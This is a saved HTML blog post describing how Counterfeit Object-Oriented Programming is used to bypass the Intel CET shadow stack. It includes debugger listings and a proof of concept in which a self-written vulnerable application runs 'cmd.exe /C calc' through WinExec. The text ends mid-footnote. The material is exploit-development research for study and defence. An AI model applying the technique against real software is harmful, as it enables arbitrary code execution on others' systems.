@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="">
+<meta name="description"
+    content="Since its inception in 20051, return-oriented programming (ROP) has been the predominant avenue to thwart W^X2 mitigation during memory corruption exploitation.
+While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets. These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<title>
+    Bypassing Intel CET with Counterfeit Objects ::   — uf0
+</title>
+	<link rel="canonical" href="https://www.matteomalvica.com/blog/2022/09/22/bypassing-intel-cet-counterfeit-objects.html" />
+<link href="../../../../ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+<link rel="stylesheet" href="../../../../main.min.ff759f2a796cae22d12f15d9ed52bb682ec25fbef0e2d95a2ae9e53f30536694.css">
+<link rel="apple-touch-icon" sizes="180x180" href="../../../../apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="../../../../favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../../../../favicon-16x16.png">
+<link rel="manifest" href="https://www.matteomalvica.com/site.webmanifest">
+<link rel="mask-icon" href="../../../../safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="../../../../favicon.ico">
+<meta name="theme-color" content="#252627">
+  <meta itemprop="name" content="Bypassing Intel CET with Counterfeit Objects">
+  <meta itemprop="description" content="CET Bypass with Counterfeit Objects">
+  <meta itemprop="datePublished" content="2022-09-22T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2022-09-22T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2932">
+  <meta itemprop="image" content="https://www.matteomalvica.com/img/coop/robbery.png">
+  <meta itemprop="keywords" content="Intel,CET,Bypass,COOP,Counterfeit Object Oriented Programming">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.matteomalvica.com/img/coop/robbery.png">
+  <meta name="twitter:title" content="Bypassing Intel CET with Counterfeit Objects">
+  <meta name="twitter:description" content="CET Bypass with Counterfeit Objects">
+<meta property="article:published_time" content="2022-09-22 00:00:00 &#43;0000 UTC" />
+    </head>
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="../../../../index.html" style="text-decoration: none;">
+    <div class="logo">
+            <span class="logo__mark">></span>
+            <span class="logo__text">/home/uf0</span>
+            <span class="logo__cursor"></span>
+    </div>
+</a>
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="../../../../blog.html">blog</a></li><li><a href="../../../../whoami.html">whoami</a></li>
+    </ul>
+</nav>
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-18TCRTW8CL"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-18TCRTW8CL');
+        }
+      </script>
+                <script async src="https://www.googletagmanager.com/gtag/js?id=G-RE0LE7QK5X"></script>
+                <script>
+                window.dataLayer = window.dataLayer || [];
+                function gtag(){dataLayer.push(arguments);}
+                gtag('js', new Date());
+                gtag('config', 'G-RE0LE7QK5X');
+                </script>
+            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+            <div class="content">
+    <main class="post">
+        <div class="post-info">
+            </p>
+        </div>
+        <article>
+            <h1 class="post-title"><a href="../../../../blog/2022/09/22/bypassing-intel-cet-counterfeit-objects.html">Bypassing Intel CET with Counterfeit Objects</a></h1>
+            <div class="post-content">
+  <img src="../../../../img/coop/robbery.png"  alt="PRE"  class="center"  />
+<p>Since its inception in 2005<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, return-oriented programming (ROP)
+has been the predominant avenue to thwart W^X<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> mitigation during
+memory corruption exploitation.</p>
+<p>While Data Execution Prevention (DEP) has been engineered to block
+plain code injection attacks from specific memory areas, attackers
+have quickly adapted and instead of injecting an entire code payload,
+they resorted in reusing multiple code chunks from DEP-allowed memory
+pages, called ROP gadgets. These code chunks are taken from already
+existing code in the target application and chained together to
+resemble the desired attacker payload or to just disable DEP on a per
+page basis to allow the existing code payloads to run.</p>
+<p>To permanently block ROP attacks, a new hardware-enforced Control Flow
+Integrity mitigation called Control Enforcement Technology (CET) has
+been developed by Intel and first shipped on Windows systems roughly
+two years ago.</p>
+<p>At first, the advent of CET painted a bleak picture future for exploit
+developers and their reliance on ROP-based techniques. However, in
+2015, a new code-reuse technique named Counterfeit Object-Oriented
+Programming (COOP) has been formulated in a paper<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> which seemed
+quite promising in defeating Control-Flow Integrity (CFI) defenses.</p>
+<p>In this blog, we&rsquo;ll briefly cover how CFI mitigations works, including
+CET, and how we can leverage COOP to effectively bypass Intel CET on
+the latest Windows releases.</p>
+<h2 id="forward-edge-and-backward-edge-cfi">Forward-Edge and Backward-Edge CFI</h2>
+<p>Control Flow Integrity mechanisms can be grouped into two main
+categories: forward-edge and backward-edge.</p>
+<p>Forward-edge CFI, like Microsoft CFG<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>, protects indirect function
+calls through the use of verified function addresses. For instance,
+if we overwrite the pointer dereferenced in a <code>CALL [rax]</code> instruction
+with a ROP gadget address, CFG will block our exploit by throwing an
+exception.</p>
+<p>Conversely, backward-edge CFI like Intel&rsquo;s CET<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> protects a
+function&rsquo;s return address by comparing it to a previously saved
+version of the address that is stored on the <em>Shadow Stack</em>.
+If the original return address gets overwritten during a memory
+corruption exploit, the address comparison will inevitably fail
+and the application will be terminated. Given that ROP-based attacks
+execute &ldquo;RET&rdquo; instructions without a prior &ldquo;CALL&rdquo; instruction, the
+running thread&rsquo;s stack and the shadow stack values mismatch and so
+backward-edge CFI like CET effectively blocks this attack technique.</p>
+<p><!-- raw HTML omitted -->Intel CET has been designed to mitigate ROP attacks through both
+the Shadow Stack and COP/JOP via Indirect Branch Tracking (IBT).
+However since the latter technology has not yet been implemented on
+Windows, in this blog post we are going to refer to &ldquo;Intel CET&rdquo; as the
+implementation with only Shadow Stack enabled.<!-- raw HTML omitted --></p>
+<p>CET internals have been documented extensively in previous researches
+<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup> and we have already demonstrated<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup> how the
+mitigation works and on which major software CET has been deployed.
+At the time of this writing the landscape hasn&rsquo;t changed much and
+every major browser continues to run CET on every process except
+the renderer process. This means that the way CET is currently implemented
+is quite ineffective because the renderer process is the one that gets
+typically exploited.</p>
+<p>Even though CET is still not widely enforced on browsers we should
+expect it to be enforced on every process over the coming years. To
+avoid getting caught unprepared, as researchers, we should improve our
+tradecraft and constantly learn about newly developed attack angles.
+Additionally, no matter how impeding a mitigation might be, we need to
+broaden our horizon if we want to find any weaknesses.</p>
+<h2 id="counterfeiting-objects">Counterfeiting Objects</h2>
+<p>As mentioned in this post&rsquo;s premise, a novel code reuse technique
+named Counterfeit Object-Oriented Programming or COOP has been put
+together by Felix Schuster in 2015. We should note that this paper is
+quite theoretical. The technique has not been observed implemented in
+the wild or in disclosed exploits. Our goal for this blog post is to
+try to leverage this theoretical approach and implement it in a proof
+of concept in order to bypass Intel CET.</p>
+<p>The main idea behind this technique is <em>counterfeiting</em> - that is
+crafting new objects in-memory from attacker-controlled payloads and
+to chain them together through virtual functions that are already
+present in the target application or in loaded libraries.</p>
+<p>Each virtual function contained in a counterfeit object is called a
+<em>vfgadget</em> and is responsible for performing a small task. Similarly
+to ROP, vfgadgets can perform tasks like populating a value
+into a register. However when grouped together, multiple vfgadgets can
+execute more advanced operations.</p>
+<p>As no specific tools exist today to discover vfgadgets, they can
+be found through custom scripts such as IDAPython, using a process
+similar to ROP gadget discovery.</p>
+<p>Since vfgadgets are picked from a pool of CFG-valid functions we can
+mark them as legitimate, and their execution will not be blocked
+by CFG once we hijack an indirect call with one of them.</p>
+<p>In addition, an interesting corollary is that Intel CET won&rsquo;t
+be triggered since we won&rsquo;t corrupt any function return address
+during the process of calling vfgadgets in sequence.</p>
+<p>As illustrated in Schuster&rsquo;s paper, a typical COOP payload begins
+with a foundational vfgadget that acts as the COOP&rsquo;s main function.
+We&rsquo;ll refer to it as <em>Looper</em> in this blog post.
+Once the attacker has assembled the counterfeit object in memory, the
+Looper vfgadget iterates over an array of other vfgadgets, carefully
+prearranged by the attacker, which will be invoked one by one. By
+aligning the vfgadgets in the counterfeit object in such a way, we&rsquo;ll be
+able to call valid virtual functions in a controlled manner.</p>
+<p>Once the Looper is running, it can then call other vfgadgets that are
+responsible for executing specific operations, like <em>Argument Loaders</em>
+<em>Invokers</em> and <em>Collectors</em>. These vfgadgets will be stored at regular
+intervals within the the array accessed by the Looper.</p>
+<p>An Argument Loader vfgadget populates a given register by loading
+a value into it. The value to be loaded will be stored inside the
+counterfeit object at an offset from the beginning of the fake
+object.</p>
+<p>Once the registers are populated by one or more Argument Loaders, an
+Invoker vfgadget can be called to simply execute the function pointer
+of the target API.</p>
+<p>Collectors are gadgets that retrieve a value already present in a
+register, and save it back into the attacker&rsquo;s counterfeit object (i.e.
+as a returned value from an invoked API).</p>
+<p>The following graph sum-up the COOP attack strategy discussed so far.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img alt="IRQL values" src="../../../../img/coop/coop.png"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><!-- raw HTML omitted -->COOP attack flow<!-- raw HTML omitted --></td>
+</tr>
+</tbody>
+</table>
+<p>We can arrange and mix different vfgadgets based on their availability
+and the desired APIs that we want to execute.</p>
+<p>In order to better understand a COOP attack, let&rsquo;s start by analyzing
+the main vfgadget, the Looper. The following assembly code provides a
+simplified version of a Looper COOP vfgadget:</p>
+<pre tabindex="0"><code>mov     rbx, [rcx+0x40]
+loop_start:
+    mov     rax, [rbx]
+    call    cs:__guard_dispatch_icall_fptr
+    mov     rbx, [rbx+20h]
+    test    rbx, rbx
+    jnz     short loop_start
+...
+loop_exit:
+    ret
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 1 - Looper Gadget relevant ASM code</em></th>
+</tr>
+</thead>
+</table>
+<p>On the first line, <code>RCX</code> holds the <em>this</em><sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup> pointer and we
+load into <code>RBX</code> the start of the counterfeit object that has been
+placed at offset 0x40 from RCX. Since all the items in our counterfeit
+objects will be referenced at offsets from the <em>this</em> pointer, we need
+to make sure to save its value before hijacking the program flow (i.e
+by corrupting a vtable).</p>
+<p>The COOP payload base address is then dereferenced into RAX which
+points to the first vfgadget that gets called. Once the call returns,
+a new vfgadget is loaded at offset 0x20 from the previous gadget and
+if the content of RBX is not zero, a new iteration of the loop takes
+place.</p>
+<p>While writing our counterfeit object in memory, we need to align
+upfront each vfgadget to match the Looper offsets, similarly to the
+following layout:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img alt="IRQL values" src="../../../../img/coop/coop_mem.png"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><!-- raw HTML omitted -->The COOP buffer in memory<!-- raw HTML omitted --></td>
+</tr>
+</tbody>
+</table>
+<p>Here, <em>00000227`26cd8900</em> is the base address of our COOP payload,
+which is stored at offset 0x40 from the <em>this</em> pointer (RCX). From the
+previous code listing, we notice at the first line of the <em>loop_start</em>
+routine that the pointer gets dereferenced into RAX, which in turn
+points to the first vfgadget. On the next loop iteration the Looper
+repeats the same task by loading a pointer at offset 0x20 from the
+previous one and ultimately invokes the second vfgadget.</p>
+<p>When exploiting real-world targets such browsers, it is recommended
+to rely on the Looper vfgadget because it gives more control and stability
+over the other vfgadgets. However, for the sake of brevity, we wrote
+our vulnerable application with only a single <em>Invoker</em> vfgadget which
+accepts one argument, as we&rsquo;ll see in the next section.</p>
+<p>Having covered introductory COOP theory, let&rsquo;s move on to exploiting
+a CET-compiled proof of concept application that we developed to
+showcase COOP attacks.</p>
+<h2 id="bypassing-the-cet-shadow-stack-with-coop">Bypassing the CET Shadow Stack with COOP</h2>
+<p>The vulnerable application we wrote is compiled with CET and CFG in
+addition to DEP, which is on by default.</p>
+<p>First off, to verify that CET is really enforced, we place a
+breakpoint on <em>printf</em>, inspect the call-stack, overwrite the return
+address and resume execution.</p>
+<pre tabindex="0"><code>0:000&gt; bp printf
+0:000&gt; g
+0:000&gt; k
+ # Child-SP          RetAddr               Call Site
+00 00000000`0014fde8 00000001`400180e8     coop!printf [C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\ucrt\stdio.h @ 956] 
+01 00000000`0014fdf0 00000001`40018d54     coop!main+0x28 [C:\Users\uf0\source\repos\COOP\COOP\coop.cpp @ 54] 
+02 (Inline Function) --------`--------     coop!invoke_main+0x22 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
+03 00000000`0014fef0 00007ffb`ec0a7034     coop!__scrt_common_main_seh+0x10c [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
+04 00000000`0014ff30 00007ffb`ecba2651     KERNEL32!BaseThreadInitThunk+0x14
+05 00000000`0014ff60 00000000`00000000     ntdll!RtlUserThreadStart+0x21
+0:000&gt; dq 00000000`0014fde8 L1
+00000000`0014fde8  00000001`400180e8 
+0:000&gt; eq 00000000`0014fde8 414141414141
+0:000&gt; dq 00000000`0014fde8 L1
+00000000`0014fde8  &lt;cr&gt;00004141`414141411&lt;/cr&gt;
+0:000&gt; g
+(16c0.f68): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)
+Subcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation
+coop!printf+0x56:
+00000001`400187e6 c3              ret
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 2 - Verifying that CET is enforced</em></th>
+</tr>
+</thead>
+</table>
+<p>We get confirmation that CET is enabled as we are immediately prompted
+with a Shadow Stack exception referring to an invalid return address.</p>
+<p><!-- raw HTML omitted -->As CET is a hardware-enforced mitigation, in order to trigger
+the above error we would need at least an 11th Generation Core &lsquo;Tiger
+Lake&rsquo; CPU<!-- raw HTML omitted --></p>
+<p>To simulate a browser vulnerability, we can obtain RIP control by
+taking advantage of a type confusion vulnerability in the application
+that is triggered automatically when the application is executed.</p>
+<p>When we hit the trigger for the vulnerability, a vtable pointer gets
+corrupted by our input, leading to an indirect call that we have
+control over. We then hijack the vtable to make it point to our COOP
+buffer where our first (and only) vfgadget resides. As mentioned
+earlier, instead of using a Looper with nested vfgadget, for the sake
+of brevity, we opted to use a single gadget that features both the
+Invoker and Argument Loader components.</p>
+<p>As part of the automated part of the exploit, in order to obtain
+the vfgadget&rsquo;s <em>this</em> pointer, we have leaked the stack pointer and
+retrieved the <em>this</em> pointer as a static offset from the stack.</p>
+<p>Once we have obtained the <em>this</em> pointer address, we prepare the
+address of the Windows API we want to invoke along with its arguments.
+This is done by writing both the Windows API address and the arguments
+at the required offsets inside the counterfeit object.</p>
+<p>Before exploring the COOP payload in more detail, let&rsquo;s first
+understand the PoC&rsquo;s syntax by running it without any arguments.</p>
+<pre tabindex="0"><code>C:\Users\offsec\source\repos\COOP\x64\Debug&gt;coop.exe
+[-] SYNTAX:
+coop.exe &lt;COOP obj ptr&gt; &lt;1st vfgadget&gt; &lt;WinAPI&gt; &lt;API argument&gt;
+[-] EXAMPLE - WinExec:
+coop.exe 00001e000000 5086014001000000 40610fecfb7f0000 &#34;cmd.exe /C calc&#34;
+[-] EXAMPLE - LoadLibraryA:
+coop.exe 00001e000000 5086014001000000 f0040becfb7f0000 &#34;edgehtml.dll&#34;
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 3 - Getting the PoC&rsquo;s syntax</em></th>
+</tr>
+</thead>
+</table>
+<p>The application accepts four parameters: a pointer to our counterfeit
+object (COOP) buffer, the vfgadget address, the Windows API address and
+its arguments. The helper shows two simple use-cases but this can be of
+course expanded to invoke any CFG-allowed API (if the application is
+compiled with it).</p>
+<p><!-- raw HTML omitted -->Since Windows DLLs will load at a random base address, it is
+required to calculate the desired API&rsquo;s address beforehand.<!-- raw HTML omitted --></p>
+<p>Let&rsquo;s first inspect the C++ code of the object related to our
+vfgadget, and then explore its corresponding assembly from the
+compiled binary:</p>
+<pre tabindex="0"><code>class OffSec {
+public:
+    char* a;
+    int (*callback)(char* a);
+public:
+    virtual void &lt;cr&gt;trigger&lt;/cr&gt;(char* a1) {
+        callback(a);
+    }
+};
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 4 - The &rsquo;trigger&rsquo; method from which we derive the vfgadget</em></th>
+</tr>
+</thead>
+</table>
+<p>The class <em>OffSec</em> present in the project contains a <em>trigger</em> method
+which acts as a C-style function pointer that we can abuse to invoke
+any API we like, as we&rsquo;ll see shortly. Then, the &lsquo;OffSec&rsquo; class is
+instantiated in the main program routine so it gets loaded in memory
+along with its methods.</p>
+<p>Taking a closer look at the Invoker in the disassembler reveals a few
+interesting aspects.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img alt="IRQL values" src="../../../../img/coop/invoker.png"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><!-- raw HTML omitted -->Invoker vfgadget<!-- raw HTML omitted --></td>
+</tr>
+</tbody>
+</table>
+<p>Starting from the second to the fourth line, the <em>this</em> pointer,
+referenced by RCX, is first stored on the stack and then moved into
+RAX. Next, the value at offset 0x10 from RAX is dereferenced and moved
+into RAX. This value will be the API function pointer residing in our
+counterfeit object. Then at line 7 and 8 the first function argument
+is dereferenced at offset 0x8 from the <em>this</em> pointer and moved into
+RCX.</p>
+<p>As we&rsquo;ll soon discover, the vulnerable application will take care of
+these offsets once we have submitted the parameters from the command
+line.</p>
+<p>Having covered the main building blocks of our attack chain, let&rsquo;s
+try to run the PoC by passing the four arguments in order to gain code
+execution:</p>
+<pre tabindex="0"><code>C:\&gt; coop.exe 00001e000000 5086014001000000 40610fecfb7f0000 &#34;cmd.exe /C calc&#34;
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 5 - Running the PoC application with all parameters</em></th>
+</tr>
+</thead>
+</table>
+<p>With the above command we provided the following parameters:
+<em>00001e000000</em> as a storage buffer for our counterfeit object,
+<em>5086014001000000</em> as the Invoker vfgadget in addition to
+<em>40610fecfb7f0000</em> which is the <em>WinExec</em> memory address. As a final
+argument we pass the WinExec string argument. Note that all memory
+addresses are passed in little-endian format.</p>
+<p>Once started, the application halts immediately, allowing us to attach
+the debugger to it. Before doing so, we launch Process Explorer to
+verify that the binary is actually running with Intel CET enabled.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img alt="IRQL values" src="../../../../img/coop/procexp2.png"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><!-- raw HTML omitted -->Verifying that CET is enabled with Process Explorer<!-- raw HTML omitted --></td>
+</tr>
+</tbody>
+</table>
+<p>Under the &ldquo;Stack Protection&rdquo; column, Process Explorer confirms that
+CET is enforced for only the CET-compatible modules, meaning that the
+mitigation will be enforced for any module compiled with CET. This
+includes our application.</p>
+<p>Once the debugger is attached, we place a breakpoint to the only
+indirect call present in the main function and continue execution.</p>
+<pre tabindex="0"><code>0:001&gt;bp 00000001`4001847e
+0:001&gt; bl
+     0 e Disable Clear  00000001`4001847e     0001 (0001)  0:**** coop!main+0x3d2
+0:001&gt; u 00000001`4001847e L1
+coop!main+0x3d2:
+00000001`4001847e ff159cbb0a00    call    qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)]
+0:000&gt; dq 0x1e0000 L1
+00000000`001e0000  &lt;cr&gt;00000001`400186a0&lt;cr&gt; 
+0:001&gt; g
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 6 - Breaking at the Indirect Call</em></th>
+</tr>
+</thead>
+</table>
+<p>We placed a breakoint at main+0x3d2 and verified that we have indeed
+an indirect call at that address. Next we dump the content of our
+counterfeit object located at the static address 0x1e0000, which holds
+a pointer to our vfgadget at <code>00000001400186a0</code></p>
+<p>At main+0x3d2 is where the type confusion bug ignites and allows us to
+take control over RIP. As soon as we hit the breakpoint we inspect the
+value residing at our COOP buffer, which should be the first Invoker
+vfgadget. We let the application continue and verify that we indeed
+hit our breakpoint.</p>
+<pre tabindex="0"><code>Breakpoint 0 hit
+coop!main+0x3d2:
+00000001`4001847e ff159cbb0a00    call    qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)}
+0:000&gt;t
+ntdll!LdrpDispatchUserCallTarget:
+00007ffb`ecbdc620 4c8b1d814d0f00  mov     r11,qword ptr [ntdll!LdrSystemDllInitBlock+0xb8 (00007ffb`eccd13a8)] ds:00007ffb`eccd13a8=00007df600000000
+0:000&gt; 
+ntdll!LdrpDispatchUserCallTarget+0x23:
+00007ff8`7c5fc643 48ffe0          jmp     rax {&lt;cr&gt;coop!OffSec::trigger&lt;/cr&gt; (00000001`400186a0)}
+...
+0:000&gt; 
+coop!OffSec::trigger:
+&lt;cr&gt;00000001`400186a0&lt;/cr&gt; 4889542410      mov     qword ptr [rsp+10h],rdx ss:00000000`0014fdf8=0000000000612b77
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 7 - Landing on the first COOP vfgadget</em></th>
+</tr>
+</thead>
+</table>
+<p>After tracing into the CFG <em>LdrpDispatchUserCallTarge</em> routine we
+jump to the Invoker vfgadget &lsquo;OffSec::trigger&quot;, proving that we have
+control over the program&rsquo;s execution flow. We then continue tracing
+inside the vfgadget:</p>
+<pre tabindex="0"><code>0:000&gt; t
+...
+coop!OffSec::trigger+0x5:
+00000001`40018655 48894c2408      mov     qword ptr [rsp+8],rcx ss:00000000`0014fdf0=00000001400a1108
+0:000&gt; dq rcx L1
+00000000`00590d80  &lt;cr&gt;00000000`001e0000&lt;/cr&gt;
+0:000&gt; t
+coop!OffSec::trigger+0xa:
+00000001`4001865a 4883ec38        sub     rsp,38h
+0:000&gt; 
+coop!OffSec::trigger+0xe:
+00000001`4001865e 488b442440      mov     rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 8 - Moving the &rsquo;this&rsquo; pointer into RAX</em></th>
+</tr>
+</thead>
+</table>
+<p>In the above listing, the Invoker first saves the <em>this</em> pointer from
+RCX into the stack, and we also verify that it points to the base of
+our COOP buffer. On the last instruction the &rsquo;this&rsquo; pointer is loaded
+into RAX, which will be used as a reference to invoke the API and its
+argument:</p>
+<pre tabindex="0"><code>0:000&gt; 
+coop!OffSec::trigger+0x13:
+00000001`40018663 488b4010        mov     rax,qword ptr [rax+10h] ds:00000000`00590d90=&lt;cr&gt;{KERNEL32!WinExec (00007ffb`ec0f6140)}&lt;/cr&gt;
+0:000&gt; 
+coop!OffSec::trigger+0x17:
+00000001`40018667 4889442420      mov     qword ptr [rsp+20h],rax ss:00000000`0014fdd0=000000000000001f
+0:000&gt; 
+coop!OffSec::trigger+0x1c:
+00000001`4001866c 488b442440      mov     rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80
+0:000&gt; 
+coop!OffSec::trigger+0x21:
+00000001`40018671 488b4808        mov     rcx,qword ptr [rax+8] ds:00000000`00590d88=00000000001e0080
+0:000&gt; dc 00000000001e0080
+00000000`001e0080  2e646d63 20657865 6320432f 00636c61  cmd.exe /C calc.
+...
+</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center"><em>Listing 9 - Loading WinExec parameters from the &rsquo;this&rsquo; pointer</em></th>
+</tr>
+</thead>
+</table>
+<p>First, at offset 0x10 we can see that WinExec address
+is loaded into RAX and then, three instructions later, the command
+parameter gets retrieved at offset 0x8.</p>
+<p>Once we let execution continue, we invoke <code>LdrpDispatchUserCallTarget</code>
+again which in turn dispatches execution to WinExec and welcomes us
+with our calculator.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img alt="IRQL values" src="../../../../img/coop/winexec.png"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><!-- raw HTML omitted -->Successfully Calling WinExec<!-- raw HTML omitted --></td>
+</tr>
+</tbody>
+</table>
+<p>This completes our brief proof-of-concept where we demonstrated that
+we can bypass the Intel CET Shadow Stack and obtain arbitrary code
+execution via a COOP attack by calling CFG-allowed functions while
+simultaneously avoiding corrupting any return address.</p>
+<p>The Visual Studio project for this PoC application can be found at the
+following <a href="https://gitlab.com/offensive-security/blog/COOP">URL</a>.</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>Intel CET provides yet another strong defensive mechanism that surely
+steps up the exploit development game. Nonetheless, new attack pathways
+such as COOP can be adopted to circumvent this mitigation. As we learned
+so far, COOP vfgadgets are inherently allowed by CFG and so, in a
+real-world scenario they could be chained together to circumvent
+Intel CET and possibly other CFI mitigations.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>(Sebastian Krahmer, 2005): <a href="../../../../ctf/exploits/references/no-nx.pdf">https://trailofbits.github.io/ctf/exploits/references/no-nx.pdf</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>(Wikipedia, 2022): <a href="https://en.wikipedia.org/wiki/W%5EX">https://en.wikipedia.org/wiki/W%5EX</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p>(Schuster F., 2015): <a href="https://www.researchgate.net/publication/283121202_Counterfeit_Object-oriented_Programming_On_the_Difficulty_of_Preventing_Code_Reuse_Attacks_in_C_Applications">https://www.researchgate.net/publication/283121202_Counterfeit_Object-oriented_Programming_On_the_Difficulty_of_Preventing_Code_Reuse_Attacks_in_C_Applications</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p>(Microsoft, 2022): <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p>(Intel, 2016): <a href="../../../../web/20170320213641/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf">https://web.archive.org/web/20170320213641/https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p>(Yarden Shafir and Alex Ionescu, 2020): <a href="https://windows-internals.com/cet-on-windows/">https://windows-internals.com/cet-on-windows/</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:7">
+<p>(Yarden Shafir, 2020): <a href="https://windows-internals.com/cet-updates-cet-on-xanax/">https://windows-internals.com/cet-updates-cet-on-xanax/</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:8">
+<p>(Offensive Security, 2021): <a href="https://www.offensive-security.com/offsec/intel-cet-in-action/">https://www.offensive-security.com/offsec/intel-cet-in-action/</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:9">
